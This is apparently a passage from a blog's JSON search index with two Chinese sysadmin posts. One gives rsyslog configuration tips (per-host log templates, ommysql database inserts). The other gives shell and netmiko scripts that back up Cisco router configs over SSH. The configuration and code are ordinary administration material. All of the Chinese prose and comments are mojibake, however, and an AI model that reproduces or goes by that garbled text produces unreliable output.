class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DAY\u003c/span\u003e\u003cspan class=\"s2\"\u003e%.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e 10.161.50.7,\u003cspan class=\"s2\"\u003e\u0026#34;/var/log/rsyslog/%fromhost-ip%/xdns_webeng_%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$YEAR\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$MONTH\u003c/span\u003e\u003cspan class=\"s2\"\u003e%-%\u003c/span\u003e\u003cspan class=\"nv\"\u003e$DAY\u003c/span\u003e\u003cspan class=\"s2\"\u003e%.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#ä»ç‰¹å®šipæ¥çš„æ—¥å¿—å‘åˆ°ç‰¹å®šrsyslogæœåŠ¡å™¨ä¸Šå»\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#:fromhost-ip, !isequal, \u0026#34;127.0.0.1\u0026#34; ?Remote\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e:fromhost-ip, isequal, \u003cspan class=\"s2\"\u003e\u0026#34;10.161.54.11\u0026#34;\u003c/span\u003e ?10.161.54.11\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e:fromhost-ip, isequal, \u003cspan class=\"s2\"\u003e\u0026#34;10.161.50.5\u0026#34;\u003c/span\u003e ?10.161.50.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e:fromhost-ip, isequal, \u003cspan class=\"s2\"\u003e\u0026#34;10.161.50.7\u0026#34;\u003c/span\u003e ?10.161.50.7\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRsyslogæ‰“å‡ºæ‰€æœ‰è°ƒè¯•ä¿¡æ¯ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e*.* /var/log/debugfmt;RSYSLOG_DebugFormat\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eè°ƒè¯•ä¿¡æ¯:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eFROMHOST: \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e, fromhost-ip: \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e, HOSTNAME: \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e, PRI: 5,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esyslogtag \u003cspan class=\"s1\"\u003e\u0026#39;time:\u0026#39;\u003c/span\u003e, programname: \u003cspan class=\"s1\"\u003e\u0026#39;time\u0026#39;\u003c/span\u003e, APP-NAME: \u003cspan class=\"s1\"\u003e\u0026#39;time\u0026#39;\u003c/span\u003e, PROCID: \u003cspan class=\"s1\"\u003e\u0026#39;-\u0026#39;\u003c/span\u003e, MSGID: \u003cspan class=\"s1\"\u003e\u0026#39;-\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTIMESTAMP: \u003cspan class=\"s1\"\u003e\u0026#39;Mar  4 09:04:45\u0026#39;\u003c/span\u003e, STRUCTURED-DATA: \u003cspan class=\"s1\"\u003e\u0026#39;-\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emsg: \u003cspan class=\"s1\"\u003e\u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eescaped msg: \u003cspan class=\"s1\"\u003e\u0026#39;2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einputname: imudp rawmsg: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026lt;5\u0026gt;time:2021-03-04 09:04:45;danger_degree:1;breaking_sighn:0;event:[50556]MySQLç™»å½•è®¤è¯æˆåŠŸ;src_addr:172.18.5.65;src_port:57953;dst_addr:172.18.20.52;dst_port:3306;user:;smt_user:;proto:MYSQL\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$!\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$.:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$/:\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRsyslogçš„isequalï¼Œä¸å»ºè®®ï¼Œå»ºè®®ç”¨==\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eif $fromhost isequal 172.18.18.9 then /var/log/nips.log\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nv\"\u003e$fromhost\u003c/span\u003e-ip \u003cspan class=\"o\"\u003e==\u003c/span\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  action\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRsyslogçš„ommysqlç”¨æ³•\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$ModLoad\u003c/span\u003e ommysql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*.info\u003cspan class=\"p\"\u003e;\u003c/span\u003email.none\u003cspan class=\"p\"\u003e;\u003c/span\u003eauthpriv.none\u003cspan class=\"p\"\u003e;\u003c/span\u003ecron.none               :ommysql:localhost,Syslog,nips,xxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*.info\u003cspan class=\"p\"\u003e;\u003c/span\u003email.none\u003cspan class=\"p\"\u003e;\u003c/span\u003eauthpriv.none\u003cspan class=\"p\"\u003e;\u003c/span\u003ecron.none               action\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e dbFormat,\u003cspan class=\"s2\"\u003e\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, %syslogfacility%, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;%syslogtag%\u0026#39;)\u0026#34;\u003c/span\u003e,sql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaction\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserverport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3306\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003etemplate\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dbFormat\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#172.18.31.34ä¸Šçš„å®é™…ç”¨æ³•ï¼š\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nv\"\u003e$fromhost\u003c/span\u003e-ip \u003cspan class=\"o\"\u003e==\u003c/span\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nv\"\u003e$syslogpriority\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"m\"\u003e7\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$template\u003c/span\u003e dbFormat1,\u003cspan class=\"s2\"\u003e\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;\u003c/span\u003e,sql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        action\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserverport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3306\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003etemplate\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dbFormat1\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$template\u003c/span\u003e dbFormat2,\u003cspan class=\"s2\"\u003e\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;time:%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;\u003c/span\u003e,sql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        action\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserverport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3306\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003etemplate\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dbFormat2\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e ~\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRsyslogä¸­\u0026amp; ~çš„ç”¨æ³•\u003c/p\u003e","title":"Rsyslogçš„ä¸€äº›ç‰¹æ®Šç”¨æ³•"},{"content":"è¿™ä¸ªå…¶å®æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆçš„å·¥ä½œï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š\nä¸€ã€ç”¨sshå¤‡ä»½Ciscoè®¾å¤‡çš„è„šæœ¬ éœ€è¦äº‹å…ˆåœ¨/root/.ssh/configé…ç½®å¥½ç›´æ¥ç™»å½•ï¼Œå¹¶ä¸”åœ¨Ciscoè®¾å¤‡é‡Œè®¾ç½®å¥½æƒé™çº§åˆ«ï¼Œå¯ä»¥æ‰§è¡Œshow run\n#!/bin/sh sshcmd=\u0026#34;ssh -o LogLevel=quiet\u0026#34; $sshcmd $1 \u0026#34;show run\u0026#34; \u0026gt; /root/backup/$1-$(date \u0026#39;+%Y%m%d\u0026#39;).txt äºŒã€å¤‡ä»½Ciscoè®¾å¤‡çš„Pythonè„šæœ¬ï¼Œè¿™ä¸ªå¯æ§æ€§æ›´é«˜ï¼š é¦–é€‰éœ€è¦åœ¨/export/servers/python363è£…å¥½python, pip install netmiko å…¶æ¬¡ï¼Œåœ¨è·¯ç”±å™¨ä¸Šå¯ä»¥é…ç½®ençš„å¯†ç \n#!/export/servers/python363/bin/python3.6 from netmiko import Netmiko import time tw_bgp = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-bgp\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.10\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;secret\u0026#34; : \u0026#34;xxxxxxxx\u0026#34;, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r1_e1 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e1\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.11\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r1_e2 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e2\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.12\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r2_e1 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e1\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.13\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r2_e2 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e2\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.14\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } devices=[tw_bgp, tw_r1_e1, tw_r1_e2, tw_r2_e1, tw_r2_e2] for dev in devices: name = dev[\u0026#34;ip\u0026#34;] connection = Netmiko(**dev) connection.enable() out = connection.send_command(\u0026#34;show running-config\u0026#34;) calender = time.strftime(\u0026#34;%Y%m%d\u0026#34;) file_name = \u0026#39;{}-{}.txt\u0026#39;.format(dev[\u0026#34;host\u0026#34;],calender) file = open(file_name ,\u0026#34;w\u0026#34;) file.write(out) file.close() connection.disconnect() print(\u0026#34;BACKUP for %s done\u0026#34; %dev[\u0026#34;host\u0026#34;]) ","permalink":"https://rendoumi.com/posts/20231211-netdev_backup/","summary":"\u003cp\u003eè¿™ä¸ªå…¶å®æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆçš„å·¥ä½œï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€ç”¨sshå¤‡ä»½Ciscoè®¾å¤‡çš„è„šæœ¬\u003c!-- raw HTML omitted --\u003e\néœ€è¦äº‹å…ˆåœ¨/root/.ssh/configé…ç½®å¥½ç›´æ¥ç™»å½•ï¼Œå¹¶ä¸”åœ¨Ciscoè®¾å¤‡é‡Œè®¾ç½®å¥½æƒé™çº§åˆ«ï¼Œå¯ä»¥æ‰§è¡Œshow run\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"nv\"\u003esshcmd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ssh -o LogLevel=quiet\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$sshcmd\u003c/span\u003e \u003cspan class=\"nv\"\u003e$1\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;show run\u0026#34;\u003c/span\u003e \u0026gt; /root/backup/\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e-\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate \u003cspan class=\"s1\"\u003e\u0026#39;+%Y%m%d\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€å¤‡ä»½Ciscoè®¾å¤‡çš„Pythonè„šæœ¬ï¼Œè¿™ä¸ªå¯æ§æ€§æ›´é«˜ï¼š\u003c!-- raw HTML omitted --\u003e\né¦–é€‰éœ€è¦åœ¨/export/servers/python363è£…å¥½python, pip install netmiko\nå…¶æ¬¡ï¼Œåœ¨è·¯ç”±å™¨ä¸Šå¯ä»¥é…ç½®ençš„å¯†ç \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"ch\"\u003e#!/export/servers/python363/bin/python3.6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003enetmiko\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eNetmiko\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_bgp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan 